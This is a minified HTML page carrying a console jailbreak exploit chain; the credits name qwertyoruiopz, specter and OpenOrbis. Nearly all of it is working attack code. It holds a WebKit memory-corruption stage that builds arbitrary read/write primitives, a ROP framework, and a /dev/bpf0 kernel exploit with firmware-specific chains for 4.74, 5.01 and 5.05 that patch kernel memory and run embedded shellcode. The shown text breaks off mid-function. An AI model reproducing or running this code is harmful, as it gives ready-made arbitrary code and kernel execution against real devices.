<!DOCTYPE html><title>FTP</title><meta content="width=device-width,initial-scale=1" name=viewport><style>.loader{position:absolute;left:50%;top:50%;margin:-75px 0 0 -75px;border:10px solid #f3f3f3;border-radius:50%;border-top:10px solid #044595;border-left:10px solid #044595;width:120px;height:120px;-webkit-animation:spin 1s linear infinite}.info{overflow:hidden;position:fixed;position:absolute;top:50%;left:50%;font-size:45px;font-family:sans-serif;transform:translate(-50%,-50%)}.credits{overflow:hidden;position:fixed;position:absolute;top:90%;left:50%;font-size:16px;font-family:sans-serif;text-align:center;transform:translate(-50%,-90%)}@-webkit-keyframes spin{0%{-webkit-transform:rotate(0)}100%{-webkit-transform:rotate(360deg)}}</style><script src=./payload.js></script><body style=margin:0><div class=loader id=loader></div><div class=info id=awaiting style=display:none>Awaiting Payload...</div><div class=info id=allset style=display:none>Success!</div><div class=info id=fail style=display:none>Fail!</div><div class=credits id=footer><ul style=list-style:none;padding-left:0><li>Bug from qwertyoruiopz<li>Homebrew thanks to flatz, xvortex<li>Implementation by specter<li>&lt;3 OpenOrbis Team</ul></div><script>window.onerror=function(a){if("Error:"==a.slice(0,6))try{window.self!==window.top&&parent.exploitDone(a),document.getElementById("loader").style.display="none",document.getElementById("fail").innerText=info,document.getElementById("fail").style.display="block"}catch(b){parent.exploitDone(a)}},window.didload=0,window.didpost=0,window.onload=function(){window.didload=1,1==window.didpost&&setTimeout(window.stage2,1500)},window.postExpl=function(){window.didpost=1,1==window.didload&&setTimeout(window.stage2,1500)};function allset(){try{window.self!==window.top&&parent.exploitDone("Success!")}catch(a){parent.exploitDone("Success!")}document.getElementById("loader").style.display="none",document.getElementById("allset").style.display="block"}function awaitpl(){var a=new XMLHttpRequest;a.open("GET","/success",!1),a.send(null);try{window.self!==window.top&&parent.exploitDone("Awaiting Payload...")}catch(a){parent.exploitDone("Awaiting Payload...")}document.getElementById("loader").style.display="none",document.getElementById("awaiting").style.display="block"}function malloc(a){var b=new Uint8Array(65536+a);window.nogc.push(b);var c=p.read8(p.leakval(b).add32(16));return c.backing=b,c}function mallocu32(a){var b=new Uint8Array(65536+4*a);window.nogc.push(b);var c=p.read8(p.leakval(b).add32(16));return c.backing=new Uint32Array(b.buffer),c}function stringify(a){for(var b=new Uint8Array(a.length+1),c=0;c<a.length;c+=1)b[c]=255&a.charCodeAt(c);return window.nogc.push(b),p.read8(p.leakval(b).add32(16))}var krop=function(a,b){return this.stackBase=b,this.stackPointer=0,this.push=function(b){a.write8(this.stackBase.add32(this.stackPointer),b),this.stackPointer+=8},this.write64=function(a,b){this.push(window.gadgets["pop rdi"]),this.push(a),this.push(window.gadgets["pop rax"]),this.push(b),this.push(window.gadgets["mov [rdi], rax"])},this};window.rop=function(){return this.stack=new Uint32Array(65536),this.stackBase=p.read8(p.leakval(this.stack).add32(16)),this.count=0,this.clear=function(){this.count=0,this.runtime=void 0;for(var a=0;2040>a;a+=1)p.write8(this.stackBase.add32(8*a),0)},this.pushSymbolic=function(){return this.count+=1,this.count-1},this.finalizeSymbolic=function(a,b){p.write8(this.stackBase.add32(8*a),b)},this.push=function(a){this.finalizeSymbolic(this.pushSymbolic(),a)},this.push_write8=function(a,b){this.push(gadgets["pop rdi"]),this.push(a),this.push(gadgets["pop rsi"]),this.push(b),this.push(gadgets["mov [rdi], rsi"])},this.fcall=function(a,b,c,d,e,f,g){return void 0!==b&&(this.push(gadgets["pop rdi"]),this.push(b)),void 0!==c&&(this.push(gadgets["pop rsi"]),this.push(c)),void 0!==d&&(this.push(gadgets["pop rdx"]),this.push(d)),void 0!==e&&(this.push(gadgets["pop rcx"]),this.push(e)),void 0!==f&&(this.push(gadgets["pop r8"]),this.push(f)),void 0!==g&&(this.push(gadgets["pop r9"]),this.push(g)),this.push(a),this},this.run=function(){var a=p.loadchain(this,this.notimes);return this.clear(),a},this};function makeid(){for(var a="",b="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",c=0;8>c;c+=1)a+=b.charAt(Math.floor(Math.random()*b.length));return a}function zeroFill(a,b){return b-=a.toString().length,0<b?Array(b+(/\./.test(a)?2:1)).join("0")+a:a+""}for(var instancespr=[],i=0;4096>i;i+=1)instancespr[i]=new Uint32Array(1),instancespr[i][makeid()]=50057;var _dview;function u2d(a,b){return _dview||(_dview=new DataView(new ArrayBuffer(16))),_dview.setUint32(0,b),_dview.setUint32(4,a),_dview.getFloat64(0)}var dgc=function(){for(var a=0;256>a;a+=1)new ArrayBuffer(1048576)};function int64(a,b){return this.low=a>>>0,this.hi=b>>>0,this.add32inplace=function(a){var b=(4294967295&(this.low>>>0)+a)>>>0,c=this.hi>>>0;b<this.low&&c++,this.hi=c,this.low=b},this.add32=function(a){var b=(4294967295&(this.low>>>0)+a)>>>0,c=this.hi>>>0;return b<this.low&&c++,new int64(b,c)},this.sub32=function(a){var b=(4294967295&(this.low>>>0)-a)>>>0,c=this.hi>>>0;return 4294967295&b>this.low&&c--,new int64(b,c)},this.sub32inplace=function(a){var b=(4294967295&(this.low>>>0)-a)>>>0,c=this.hi>>>0;4294967295&b>this.low&&c--,this.hi=c,this.low=b},this.and32=function(a){var b=this.low&a,c=this.hi;return new int64(b,c)},this.and64=function(a,b){var c=this.low&a,d=this.hi&b;return new int64(c,d)},this.toString=function(a){a=16;var b=(this.low>>>0).toString(a),c=(this.hi>>>0).toString(a);return 0==this.hi?b:(b=zeroFill(b,8),c+b)},this.toPacked=function(){return{hi:this.hi,low:this.low}},this.setPacked=function(a){return this.hi=a.hi,this.low=a.low,this},this}var nogc=[],tgt={a:0,b:0,c:0,d:0},y=new ImageData(1,16384);postMessage("","*",[y.data.buffer]);for(var props={},i=0;i<8192;)props[i++]={value:1111638594},props[i++]={value:tgt};for(var foundLeak=void 0,foundIndex=0,maxCount=256;foundLeak==null&&0<maxCount;){maxCount--,history.pushState(y,""),Object.defineProperties({},props);for(var leak=new Uint32Array(history.state.data.buffer),i=0;i<leak.length-6;i+=1)if(1111638594==leak[i]&&4294901760==leak[i+1]&&0==leak[i+2]&&0==leak[i+3]&&0==leak[i+4]&&0==leak[i+5]&&14==leak[i+6]&&0==leak[i+7]&&0==leak[i+10]&&0==leak[i+11]&&0==leak[i+12]&&0==leak[i+13]&&14==leak[i+14]&&0==leak[i+15]){foundIndex=i,foundLeak=leak;break}}if(!foundLeak)throw new Error("Failed to find leak!");var firstLeak=Array.prototype.slice.call(foundLeak,foundIndex,foundIndex+64),leakJSVal=new int64(firstLeak[8],firstLeak[9]);Array.prototype.__defineGetter__(100,()=>1);var f=document.body.appendChild(document.createElement("iframe")),a=new f.contentWindow.Array(13.37,13.37),b=new f.contentWindow.Array(u2d(leakJSVal.low+16,leakJSVal.hi),13.37),master=new Uint32Array(4096),slave=new Uint32Array(4096),leakval_u32=new Uint32Array(4096),leakval_helper=[slave,2,3,4,5,6,7,8,9,10];tgt.a=u2d(2048,23077632),tgt.b=0,tgt.c=leakval_helper,tgt.d=4919;var c=Array.prototype.concat.call(a,b);document.body.removeChild(f);var hax=c[0];c[0]=0,tgt.c=c,hax[2]=0,hax[3]=0,Object.defineProperty(Array.prototype,100,{get:void 0}),tgt.c=leakval_helper;var butterfly=new int64(hax[2],hax[3]);butterfly.low+=16,tgt.c=leakval_u32;var lkv_u32_old=new int64(hax[4],hax[5]);hax[4]=butterfly.low,hax[5]=butterfly.hi,tgt.c=master,hax[4]=leakval_u32[0],hax[5]=leakval_u32[1];var addr_to_slavebuf=new int64(master[4],master[5]);tgt.c=leakval_u32,hax[4]=lkv_u32_old.low,hax[5]=lkv_u32_old.hi,tgt.c=0,hax=0;var prim={write8:function(a,b){master[4]=a.low,master[5]=a.hi,b instanceof int64?(slave[0]=b.low,slave[1]=b.hi):(slave[0]=b,slave[1]=0),master[4]=addr_to_slavebuf.low,master[5]=addr_to_slavebuf.hi},write4:function(a,b){master[4]=a.low,master[5]=a.hi,slave[0]=b,master[4]=addr_to_slavebuf.low,master[5]=addr_to_slavebuf.hi},read8:function(a){master[4]=a.low,master[5]=a.hi;var b=new int64(slave[0],slave[1]);return master[4]=addr_to_slavebuf.low,master[5]=addr_to_slavebuf.hi,b},read4:function(a){master[4]=a.low,master[5]=a.hi;var b=slave[0];return master[4]=addr_to_slavebuf.low,master[5]=addr_to_slavebuf.hi,b},leakval:function(a){leakval_helper[0]=a;var b=this.read8(butterfly);return this.write8(butterfly,new int64(1094795585,4294901760)),b},createval:function(a){this.write8(butterfly,a);var b=leakval_helper[0];return this.write8(butterfly,new int64(1094795585,4294901760)),b}};window.primitives=prim,window.postExpl&&window.postExpl();function kernExploit(){try{var a=function(a){return window.webKitBase.add32(a)},b=p.syscall(5,p.stringify("/dev/bpf0"),2).low,c=p.syscall(5,p.stringify("/dev/bpf0"),2).low;if(4294967295==b)throw new Error("Failed to open first bpf device!");var d=p.malloc32(16384),e=p.malloc32(16384),f=d.backing,g=p.malloc(64);p.write8(g,256),p.write8(g.add32(8),d);var h=p.malloc(64);p.write8(h,256),p.write8(h.add32(8),e);for(var j=0;1024>j;)f[j++]=6,f[j++]=0;var k=p.syscall(54,b,2148549243,g);if(0!=k.low)throw new Error("Failed to open first bpf device!");var l,m,n=function(a,b){var c=window.gadgets.longjmp,d=window.gadgets.createThread,e=p.malloc32(8192),f=e.backing;f[0]=1337;var g=new rop;g.push(window.gadgets.ret),g.push(window.gadgets.ret),g.push(window.gadgets.ret),g.push(window.gadgets.ret),b(g),p.write8(e,window.gadgets.ret),p.write8(e.add32(16),g.stackBase),p.syscall(324,1);var h=function(){p.fcall(d,c,e,p.stringify(a))};return window.nogc.push(e),window.nogc.push(g),h},o=p.syscall(97,2,2),q=p.malloc32(4096),r=n("GottaGoFast",function(a){l=a.stackBase,a.push(window.gadgets.ret),a.push(window.gadgets.ret),a.push(window.gadgets.ret),a.push(window.gadgets["pop rdi"]),a.push(b),a.push(window.gadgets["pop rsi"]),a.push(2148549243),a.push(window.gadgets["pop rdx"]),a.push(g),a.push(window.gadgets["pop rsp"]),a.push(a.stackBase.add32(2048)),a.count=256;var c=a.count;a.push(window.syscalls[54]),a.push_write8(a.stackBase.add32(8*c),window.syscalls[54]),a.push(window.gadgets["pop rdi"]);var d=a.pushSymbolic();a.push(window.gadgets["pop rsi"]);var e=a.pushSymbolic();a.push(window.gadgets["mov [rdi], rsi"]),a.push(window.gadgets["pop rsp"]),m=a.stackBase.add32(8*a.count),a.push(1094795585),a.finalizeSymbolic(d,m),a.finalizeSymbolic(e,m.sub32(8))}),s=new rop,t=new rop;if("5.01"==fwFromUA){var u=p.malloc32(8192),v=p.malloc32(8192),w=p.malloc32(8192);p.write8(e.add32(16),u),p.write8(u.add32(80),0),p.write8(u.add32(104),v);var x=0;p.write8(v.add32(16),a(19535949)),x+=96,p.write8(u.add32(0),w),p.write8(u.add32(16),w.add32(8)),p.write8(w.add32(2e3),a(7271141));for(var y=w,j=0;15>j;j+=1)p.write8(y,a(19535949)),x+=96,p.write8(y.add32(2032),a(7271141)),p.write8(y.add32(8),y.add32(32)),p.write8(y.add32(24),y.add32(40)),y=y.add32(32);var z=y,A=y.add32(8),B=get_jmptgt(webKitBase.add32(248));B=p.read8(B),p.write8(z,a(22848155)),x+=8,p.write8(A.add32(112),a(19416756)),x+=8,p.write8(A.add32(24),A),p.write8(A.add32(8),s.stackBase),p.write8(z.add32(48),a(985418)),p.write8(A,z),p.write8(z.add32(1056),a(2566305)),p.write8(z.add32(64),B.add32(50));var C=x+40;p.write8(A.add32(176),C);for(var j=0;512>j;j+=1)p.write8(s.stackBase.add32(8*j),window.gadgets.ret);s.count=16;var D=function(a,b){s.push(window.gadgets["pop rax"]),s.push(q),s.push(window.gadgets["mov rax, [rax]"]),s.push(window.gadgets["pop rsi"]),s.push(a),s.push(window.gadgets["add rax, rsi"]),s.push(window.gadgets["pop rsi"]),s.push(b),s.push(window.gadgets["mov [rax], rsi"])},E=function(a,b){s.push(window.gadgets["pop rax"]),s.push(q),s.push(window.gadgets["mov rax, [rax]"]),s.push(window.gadgets["pop rsi"]),s.push(a),s.push(window.gadgets["add rax, rsi"]),s.push(window.gadgets["mov rdi, rax"]),s.push(window.gadgets["pop rax"]),s.push(q),s.push(window.gadgets["mov rax, [rax]"]),s.push(window.gadgets["pop rsi"]),s.push(b),s.push(window.gadgets["add rax, rsi"]),s.push(window.gadgets["mov [rdi], rax"])};p.write8(q.add32(1056),window.gadgets["pop rdi"]),p.write8(q.add32(64),window.gadgets["pop rax"]),p.write8(q.add32(24),q),s.push(window.gadgets["pop rdi"]),s.push(q.add32(24)),s.push(window.gadgets["mov rbp, rsp"]);var F=C-8*s.count+40;s.push(a(2566305)),s.push(window.gadgets["pop rax"]),s.push(F),s.push(window.gadgets["add rdi, rax"]),s.push(window.gadgets["mov rax, [rdi]"]),s.push(window.gadgets["pop rsi"]),s.push(762),s.push(window.gadgets["add rax, rsi"]),s.push(window.gadgets["mov [rdi], rax"]);var G=p.malloc32(4096);s.push(window.gadgets["pop rdi"]),s.push(q),s.push(window.gadgets["mov [rdi], rax"]),s.push(window.gadgets["pop rsi"]),s.push(808116),s.push(window.gadgets["add rax, rsi"]),s.push(window.gadgets["pop rdi"]),s.push(q.add32(8)),s.push(window.gadgets["mov [rdi], rax"]),s.push(window.gadgets["jmp rax"]),s.push(window.gadgets["pop rdi"]),s.push(q.add32(16)),s.push(window.gadgets["mov [rdi], rax"]),s.push(window.gadgets["pop rsi"]),s.push(new int64(4294901759,4294967295)),s.push(window.gadgets["and rax, rsi"]),s.push(window.gadgets["mov rdx, rax"]),s.push(window.gadgets["pop rax"]),s.push(q.add32(8)),s.push(window.gadgets["mov rax, [rax]"]),s.push(window.gadgets["pop rsi"]),s.push(9),s.push(window.gadgets["add rax, rsi"]),s.push(window.gadgets["mov rdi, rax"]),s.push(window.gadgets["mov rax, rdx"]),s.push(window.gadgets["jmp rdi"]),s.push(window.gadgets["pop rax"]),s.push(q),s.push(window.gadgets["mov rax, [rax]"]),s.push(window.gadgets["pop rsi"]),s.push(221338),s.push(window.gadgets["add rax, rsi"]),s.push(window.gadgets["mov rax, [rax]"]),s.push(window.gadgets["pop rdi"]),s.push(q.add32(816)),s.push(window.gadgets["mov [rdi], rax"]),patch_mprotect=new int64(2425420344,2425393296),D(221338,patch_mprotect),D(20169812,G);var H=new int64(4293816342,4294967295),I=new int64(184,3297329408);D(H,I);var J=new int64(4293470775,4294967295),K=new int64(4293470805,4294967295),L=new int64(0,1082624841),M=new int64(2425388523,1922076816);D(J,L),D(K,M);var N=new int64(4294769332,4294967295),O=new int64(934690871,826654769);D(N,O);var P=new int64(233,2336788480),Q=new int64(2428747825,2425393296);D(828366,P),D(1329396,Q);var R=new int64(15789508,0),S=new int64(15789516,0),T=new int64(4293548548,4294967295),U=new int64(15789548,0),V=new int64(2,0),W=new int64(0,1);D(R,V),E(S,T),D(U,W),s.push(window.gadgets["pop rax"]),s.push(q.add32(8)),s.push(window.gadgets["mov rax, [rax]"]),s.push(window.gadgets["pop rsi"]),s.push(9),s.push(window.gadgets["add rax, rsi"]),s.push(window.gadgets["mov rdi, rax"]),s.push(window.gadgets["pop rax"]),s.push(q.add32(16)),s.push(window.gadgets["mov rax, [rax]"]),s.push(window.gadgets["jmp rdi"]),s.push(a(380345)),s.push(q.add32(4096))}else if("5.05"==fwFromUA){var u=p.malloc32(8192),v=p.malloc32(8192),w=p.malloc32(8192);p.write8(e.add32(16),u),p.write8(u.add32(80),0),p.write8(u.add32(104),v);var x=0;p.write8(v.add32(16),a(19536333)),x+=96,p.write8(u.add32(0),w),p.write8(u.add32(16),w.add32(8)),p.write8(w.add32(2e3),a(7271653));for(var y=w,j=0;15>j;j+=1)p.write8(y,a(19536333)),x+=96,p.write8(y.add32(2032),a(7271653)),p.write8(y.add32(8),y.add32(32)),p.write8(y.add32(24),y.add32(40)),y=y.add32(32);var z=y,A=y.add32(8),B=get_jmptgt(webKitBase.add32(248));B=p.read8(B),p.write8(z,a(22848539)),x+=8,p.write8(A.add32(112),a(19417140)),x+=8,p.write8(A.add32(24),A),p.write8(A.add32(8),s.stackBase),p.write8(z.add32(48),window.gadgets["mov rbp, rsp"]),p.write8(A,z),p.write8(z.add32(1056),a(2566497)),p.write8(z.add32(64),B.add32(50));var C=x+40;p.write8(A.add32(176),C);for(var j=0;512>j;j+=1)p.write8(s.stackBase.add32(8*j),window.gadgets.ret);s.count=16;var D=function(a,b){s.push(window.gadgets["pop rax"]),s.push(q),s.push(window.gadgets["mov rax, [rax]"]),s.push(window.gadgets["pop rsi"]),s.push(a),s.push(window.gadgets["add rax, rsi"]),s.push(window.gadgets["pop rsi"]),s.push(b),s.push(window.gadgets["mov [rax], rsi"])},E=function(a,b){s.push(window.gadgets["pop rax"]),s.push(q),s.push(window.gadgets["mov rax, [rax]"]),s.push(window.gadgets["pop rsi"]),s.push(a),s.push(window.gadgets["add rax, rsi"]),s.push(window.gadgets["mov rdi, rax"]),s.push(window.gadgets["pop rax"]),s.push(q),s.push(window.gadgets["mov rax, [rax]"]),s.push(window.gadgets["pop rsi"]),s.push(b),s.push(window.gadgets["add rax, rsi"]),s.push(window.gadgets["mov [rdi], rax"])};p.write8(q.add32(1056),window.gadgets["pop rdi"]),p.write8(q.add32(64),window.gadgets["pop rax"]),p.write8(q.add32(24),q),s.push(window.gadgets["pop rdi"]),s.push(q.add32(24)),s.push(window.gadgets["mov rbp, rsp"]);var F=C-8*s.count+40;s.push(a(2566497)),s.push(window.gadgets["pop rax"]),s.push(F),s.push(window.gadgets["add rdi, rax"]),s.push(window.gadgets["mov rax, [rdi]"]),s.push(window.gadgets["pop rsi"]),s.push(762),s.push(window.gadgets["add rax, rsi"]),s.push(window.gadgets["mov [rdi], rax"]);var G=p.malloc32(4096);s.push(window.gadgets["pop rdi"]),s.push(q),s.push(window.gadgets["mov [rdi], rax"]),s.push(window.gadgets["pop rsi"]),s.push(808116),s.push(window.gadgets["add rax, rsi"]),s.push(window.gadgets["pop rdi"]),s.push(q.add32(8)),s.push(window.gadgets["mov [rdi], rax"]),s.push(window.gadgets["jmp rax"]),s.push(window.gadgets["pop rdi"]),s.push(q.add32(16)),s.push(window.gadgets["mov [rdi], rax"]),s.push(window.gadgets["pop rsi"]),s.push(new int64(4294901759,4294967295)),s.push(window.gadgets["and rax, rsi"]),s.push(window.gadgets["mov rdx, rax"]),s.push(window.gadgets["pop rax"]),s.push(q.add32(8)),s.push(window.gadgets["mov rax, [rax]"]),s.push(window.gadgets["pop rsi"]),s.push(9),s.push(window.gadgets["add rax, rsi"]),s.push(window.gadgets["mov rdi, rax"]),s.push(window.gadgets["mov rax, rdx"]),s.push(window.gadgets["jmp rdi"]),s.push(window.gadgets["pop rax"]),s.push(q),s.push(window.gadgets["mov rax, [rax]"]),s.push(window.gadgets["pop rsi"]),s.push(221338),s.push(window.gadgets["add rax, rsi"]),s.push(window.gadgets["mov rax, [rax]"]),s.push(window.gadgets["pop rdi"]),s.push(q.add32(816)),s.push(window.gadgets["mov [rdi], rax"]),patch_mprotect=new int64(2425420344,2425393296),D(221338,patch_mprotect),D(20169540,G);var H=new int64(4293816070,4294967295),I=new int64(184,3297329408);D(H,I);var J=new int64(4293470503,4294967295),K=new int64(4293470533,4294967295),L=new int64(0,1082624841),M=new int64(2425388523,1922076816);D(J,L),D(K,M);var N=new int64(4294769332,4294967295),O=new int64(934690871,826654769);D(N,O);var P=new int64(115177,2336788480),Q=new int64(2428747825,2425393296);D(828366,P),D(1329844,Q);var R=new int64(15789236,0),S=new int64(15789244,0),T=new int64(4293548276,4294967295),U=new int64(15789276,0),V=new int64(2,0),W=new int64(0,1);D(R,V),E(S,T),D(U,W),s.push(window.gadgets["pop rax"]),s.push(q.add32(8)),s.push(window.gadgets["mov rax, [rax]"]),s.push(window.gadgets["pop rsi"]),s.push(9),s.push(window.gadgets["add rax, rsi"]),s.push(window.gadgets["mov rdi, rax"]),s.push(window.gadgets["pop rax"]),s.push(q.add32(16)),s.push(window.gadgets["mov rax, [rax]"]),s.push(window.gadgets["jmp rdi"]),s.push(a(380345)),s.push(q.add32(4096))}else if("4.74"==fwFromUA){var u=p.malloc32(4096),v=p.malloc32(4096),w=p.malloc32(4096);p.write8(e.add32(16),u),p.write8(u.add32(80),0),p.write8(u.add32(104),v);var x=0;p.write8(v.add32(16),window.gadgets.jop1),x=80,p.write8(u.add32(0),w),p.write8(u.add32(16),w.add32(8)),p.write8(w.add32(2e3),window.gadgets.jop2);for(var y=w,j=0;15>j;j++)p.write8(y,window.gadgets.jop1),x+=80,p.write8(y.add32(2032),window.gadgets.jop2),p.write8(y.add32(8),y.add32(32)),p.write8(y.add32(24),y.add32(40)),y=y.add32(32);var z=y,A=y.add32(8),B=get_jmptgt(webKitBase.add32(248));B=p.read8(B),p.write8(z,window.gadgets.jop3),x+=8,p.write8(A.add32(112),window.gadgets.jop4),x+=8,p.write8(A.add32(24),A),p.write8(A.add32(8),s.stackBase),p.write8(z.add32(48),window.gadgets.jop5),p.write8(A.add32(0),z),p.write8(z.add32(1056),window.gadgets.jop6);var C=x+40;p.write8(z.add32(64),B.add32(50)),p.write8(A.add32(176),C);for(var j=0;512>j;j++)p.write8(s.stackBase.add32(8*j),window.gadgets.ret);s.count=16,p.write8(q.add32(1056),window.gadgets["pop rdi"]),p.write8(q.add32(64),window.gadgets["pop rax"]),p.write8(q.add32(24),q),s.push(window.gadgets["pop rdi"]),s.push(q.add32(24)),s.push(window.gadgets["mov rbp, rsp"]);var F=C-8*s.count+40;s.push(window.gadgets.jop6),s.push(window.gadgets["pop rax"]),s.push(F),s.push(window.gadgets["add rdi, rax"]),s.push(window.gadgets["mov rax, [rdi]"]),s.push(window.gadgets["pop rcx"]),s.push(1984672),s.push(window.gadgets["sub rax, rcx"]),s.push(window.gadgets["mov rdx, rax"]),s.push(window.gadgets["pop rsi"]),s.push(q.add32(144)),s.push(window.gadgets["mov [rsi], rdx"]),s.push(window.gadgets["pop rax"]),s.push(window.gadgets.test),s.push(window.gadgets["mov [rdi], rax"]),s.push(window.gadgets["pop rax"]),s.push(q.add32(144)),s.push(window.gadgets["mov rax, [rax]"]),s.push(window.gadgets["pop rcx"]),s.push(2634025),s.push(window.gadgets["add rax, rcx"]),s.push(window.gadgets["mov rdx, rax"]),s.push(window.gadgets["pop rax"]),s.push(2147745843),s.push(a(1382343));var X=new int64(184,3330883840);s.push(window.gadgets["pop rax"]),s.push(q.add32(144)),s.push(window.gadgets["mov rax, [rax]"]),s.push(window.gadgets["pop rcx"]),s.push(1129331),s.push(window.gadgets["add rax, rcx"]),s.push(window.gadgets["pop rsi"]),s.push(X),s.push(window.gadgets["mov [rax], rsi"]);var Y=new int64(2425416248,2425393296);s.push(window.gadgets["pop rax"]),s.push(q.add32(144)),s.push(window.gadgets["mov rax, [rax]"]),s.push(window.gadgets["pop rcx"]),s.push(3766390),s.push(window.gadgets["add rax, rcx"]),s.push(window.gadgets["pop rsi"]),s.push(Y),s.push(window.gadgets["mov [rax], rsi"]);var Z=new int64(934691127,826654769);s.push(window.gadgets["pop rax"]),s.push(q.add32(144)),s.push(window.gadgets["mov rax, [rax]"]),s.push(window.gadgets["pop rcx"]),s.push(1315748),s.push(window.gadgets["add rax, rcx"]),s.push(window.gadgets["pop rsi"]),s.push(Z),s.push(window.gadgets["mov [rax], rsi"]);var $=new int64(0,1082624841),_=new int64(2425387499,1922076816);s.push(window.gadgets["pop rax"]),s.push(q.add32(144)),s.push(window.gadgets["mov rax, [rax]"]),s.push(window.gadgets["pop rcx"]),s.push(4052147),s.push(window.gadgets["add rax, rcx"]),s.push(window.gadgets["pop rsi"]),s.push($),s.push(window.gadgets["mov [rax], rsi"]),s.push(window.gadgets["pop rax"]),s.push(q.add32(144)),s.push(window.gadgets["mov rax, [rax]"]),s.push(window.gadgets["pop rcx"]),s.push(4052177),s.push(window.gadgets["add rax, rcx"]),s.push(window.gadgets["pop rsi"]),s.push(_),s.push(window.gadgets["mov [rax], rsi"]);var aa=new int64(217833,2336788480),ba=new int64(2428747825,2425393296);s.push(window.gadgets["pop rax"]),s.push(q.add32(144)),s.push(window.gadgets["mov rax, [rax]"]),s.push(window.gadgets["pop rcx"]),s.push(3999150),s.push(window.gadgets["add rax, rcx"]),s.push(window.gadgets["pop rsi"]),s.push(aa),s.push(window.gadgets["mov [rax], rsi"]),s.push(window.gadgets["pop rax"]),s.push(q.add32(144)),s.push(window.gadgets["mov rax, [rax]"]),s.push(window.gadgets["pop rcx"]),s.push(427680),s.push(window.gadgets["add rax, rcx"]),s.push(window.gadgets["pop rsi"]),s.push(ba),s.push(window.gadgets["mov [rax], rsi"]);var ca=new int64(0,1);s.push(window.gadgets["pop rax"]),s.push(q.add32(144)),s.push(window.gadgets["mov rax, [rax]"]),s.push(window.gadgets["pop rcx"]),s.push(16992672),s.push(window.gadgets["add rax, rcx"]),s.push(window.gadgets["pop rsi"]),s.push(2),s.push(window.gadgets["mov [rax], rsi"]),s.push(window.gadgets["pop rsi"]),s.push(1284655),s.push(window.gadgets["pop rdi"]),s.push(q.add32(144)),s.push(a(18469360)),s.push(window.gadgets["pop rax"]),s.push(q.add32(144)),s.push(window.gadgets["mov rax, [rax]"]),s.push(window.gadgets["pop rcx"]),s.push(16992680),s.push(window.gadgets["add rax, rcx"]),s.push(window.gadgets["mov [rax], rsi"]),s.push(window.gadgets["pop rax"]),s.push(q.add32(144)),s.push(window.gadgets["mov rax, [rax]"]),s.push(window.gadgets["pop rcx"]),s.push(16992712),s.push(window.gadgets["add rax, rcx"]),s.push(window.gadgets["pop rsi"]),s.push(ca),s.push(window.gadgets["mov [rax], rsi"]),s.push(window.gadgets["pop rax"]),s.push(q.add32(144)),s.push(window.gadgets["mov rax, [rax]"]),s.push(window.gadgets["pop rcx"]),s.push(2634016),s.push(window.gadgets["add rax, rcx"]),s.push(window.gadgets["jmp rax"]);var G=p.malloc32(4096);s.push(window.gadgets["pop rdi"]),s.push(q),s.push(window.gadgets["mov [rdi], rax"]),s.push(window.gadgets.ret2userland),s.push(q.add32(4096))}var da=p.malloc32(16),ea=p.malloc32(256);if(ea.backing[0]=o,ea.backing[2]=131071,ea.backing[3]=1,ea.backing[4]=5,"5.01"==fwFromUA)var fa=[35817,2425393152,2425393296,2425393296,8567125,2303246336,1096172005,1398030677,2303275535,3149957588,256,551862601,1220806985,9831821,2370371584,4265616532,2370699263,3749717172,2370633744,1521493164,2169045059,1265721540,277432321,4202255,698,3867757568,524479,3607052544,960335176,1207959552,3224487561,2211839809,3698655723,1103114587,1096630620,2428722526,1032669269,4294967160,2303260209,15293925,1207959552,770247,2303262720,3271888842,1818324331,979595116,628633632,1815490864,2648,0,0,0,0,0,0,0,0,0,0,0,0,0,0];else if("5.05"==fwFromUA)var fa=[35817,2425393152,2425393296,2425393296,8567125,2303246336,1096172005,1398030677,2303275535,3149957588,256,551862601,1220806985,9831821,2370371584,4265616532,2370699263,3767542964,2370633744,1585456300,2169045059,1265721540,277432321,4202255,698,3867757568,524479,3607052544,960335176,1207959552,3224487561,2211839809,3698655723,1103114587,1096630620,2428722526,1032669269,4294967160,2303260209,15293925,1207959552,770247,2303262720,3271888842,1818324331,979595116,628633632,1815490864,2648,0,0,0,0,0,0,0,0,0,0,0,0,0,0];else if("4.74"==fwFromUA)var fa=[35817,2425393152,2425393296,2425393296,8567125,2303246336,1096172005,1398030677,2303275535,3149957588,256,551862601,1220806985,9831821,2370371584,1211114644,2370699215,3455067316,2370633742,3344966828,2169110480,1711632580,277432321,4202255,698,3867757568,524479,3607052544,960335176,1207959552,3224487561,2211839809,3698655723,1103114587,1096630620,2428722526,1032669269,4294967160,2303260209,15293925,1207959552,770247,2303262720,3271888842,1818324331,979595116,628633632,1815490864,2648,0,0,0,0,0,0,0,0,0,0,0,0,0,0];for(var j=0;j<fa.length;j++)G.backing[j]=fa[j];var ga=0;for(r();;)if(t.count=0,t.push(window.syscalls[362]),t.push(window.gadgets["pop rdi"]),t.push(da),t.push(window.gadgets["mov [rdi], rax"]),t.push(window.gadgets.ret),t.push(window.gadgets.ret),t.push(window.gadgets.ret),t.push(window.gadgets.ret),t.push_write8(m,l),t.push(window.gadgets["pop rdi"]),t.push(b),t.push(window.gadgets["pop rsi"]),t.push(2148549243),t.push(window.gadgets["pop rdx"]),t.push(g),t.push(window.syscalls[54]),t.push(window.gadgets["pop rax"]),t.push(da),t.push(window.gadgets["mov rax, [rax]"]),"5.05"==fwFromUA?t.push(window.gadgets["mov rdi, rax"]):"4.74"==fwFromUA&&(t.push(window.gadgets["pop rdi"]),t.push(0),t.push(window.gadgets["add rdi, rax"])),t.push(window.gadgets["pop rsi"]),t.push(ea),t.push(window.gadgets["pop rdx"]),t.push(1),t.push(window.gadgets["pop rcx"]),t.push(0),t.push(window.gadgets["pop r8"]),t.push(0),t.push(window.syscalls[363]),t.push(window.gadgets["pop rdi"]),t.push(c),t.push(window.gadgets["pop rsi"]),t.push(2148549243),t.push(window.gadgets["pop rdx"]),t.push(h),t.push(window.syscalls[54]),t.push(window.gadgets["pop rax"]),t.push(da),t.push(window.gadgets["mov rax, [rax]"]),"5.05"==fwFromUA?t.push(window.gadgets["mov rdi, rax"]):"4.74"==fwFromUA&&(t.push(window.gadgets["pop rdi"]),t.push(0),t.push(window.gadgets["add rdi, rax"])),t.push(window.syscalls[6]),ga++,t.run(),0!=q.backing[0])return p.syscall(74,G,16384,7),p.fcall(G),!0}catch(a){throw new Error(a)}return!1}var p,print=function(a){document.getElementById("console").innerText+=a+"\n"},print=function(a){document.getElementById("console").innerHTML+=a+"\n"},get_jmptgt=function(a){var b=65535&p.read4(a),c=p.read4(a.add32(2));return 